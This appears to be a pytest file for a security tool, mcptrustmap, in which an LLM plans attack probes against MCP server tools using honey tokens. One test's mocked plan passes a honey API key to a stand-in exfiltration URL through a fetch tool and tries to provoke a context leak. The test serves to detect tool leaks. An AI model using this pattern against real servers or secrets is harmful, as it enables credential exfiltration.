"""Runtime: the LLM-driven attacker plans probes; deterministic probes are the floor."""

from __future__ import annotations

import pytest

from mcptrustmap.agent.llm_client import LLMClient
from mcptrustmap.errors import SchemaValidationError
from mcptrustmap.evidence.roles import assign_roles
from mcptrustmap.models import ArgRecord, ToolRecord
from mcptrustmap.runtime.attacker import LLMAttacker, build_attack_request, parse_attack_plan
from mcptrustmap.runtime.honey import mint_honey


def _tools() -> list[ToolRecord]:
    fetch = ToolRecord(
        name="fetch",
        description="fetch a url",
        arguments=[ArgRecord(name="url"), ArgRecord(name="api_key")],
    )
    leak = ToolRecord(name="read_secret", description="read the secret")
    for tool in (fetch, leak):
        assign_roles(tool)
    return [fetch, leak]


def test_request_is_hash_stable_and_carries_arsenal():
    honey = mint_honey("s", declared_root="/honey")
    req = build_attack_request(_tools(), honey, sink_url="http://sink/", model="claude-opus-4-8")
    assert req["purpose"] == "runtime-attack"
    assert req["arsenal"]["sink_url"] == "http://sink/"
    assert any(m.startswith("MTMHONEY-") for m in req["arsenal"]["honey_markers"])
    # stable across calls (no clocks / nondeterminism)
    assert req == build_attack_request(
        _tools(), honey, sink_url="http://sink/", model="claude-opus-4-8"
    )


def test_parse_drops_probes_for_unknown_tools():
    payload = {
        "probes": [
            {"tool": "fetch", "arguments": {"url": "x"}},
            {"tool": "ghost", "arguments": {}},
        ]
    }
    plan = parse_attack_plan(payload, {"fetch"})
    assert plan == [("fetch", {"url": "x"})]


def test_parse_rejects_malformed_plan():
    with pytest.raises(SchemaValidationError):
        parse_attack_plan({"probes": [{"arguments": {}}]}, {"fetch"})  # missing tool


def test_no_client_falls_back_to_deterministic_probes():
    honey = mint_honey("s", declared_root="/honey")
    plan = LLMAttacker(None).plan(_tools(), honey, sink_url="http://sink/")
    assert {name for name, _ in plan} == {"fetch", "read_secret"}


def test_record_then_replay_round_trips_a_plan(tmp_path):
    honey = mint_honey("s", declared_root="/honey")
    tools = _tools()

    def responder(request, context):
        assert request["purpose"] == "runtime-attack"
        token = request["arsenal"]["honey_secrets"][0]
        return {
            "probes": [
                {
                    "tool": "fetch",
                    "arguments": {"url": request["arsenal"]["sink_url"], "api_key": token},
                },
                {"tool": "read_secret", "arguments": {}, "rationale": "provoke a context leak"},
            ]
        }

    rec = LLMClient.record(responder)
    planned = LLMAttacker(rec).plan(tools, honey, sink_url="http://sink/exfil")
    assert planned[0][0] == "fetch"
    assert planned[0][1]["api_key"].startswith("sk-MTMHONEY-")
    assert planned[1] == ("read_secret", {})

    # the baked cassette replays the same plan with no responder
    replay = LLMClient("replay", cassettes=rec.recorded())
    assert LLMAttacker(replay).plan(tools, honey, sink_url="http://sink/exfil") == planned


def test_degenerate_plan_gets_deterministic_floor():
    honey = mint_honey("s", declared_root="/honey")
    rec = LLMClient.record(lambda req, ctx: {"probes": []})
    plan = LLMAttacker(rec).plan(_tools(), honey, sink_url="http://sink/")
    assert {name for name, _ in plan} == {"fetch", "read_secret"}
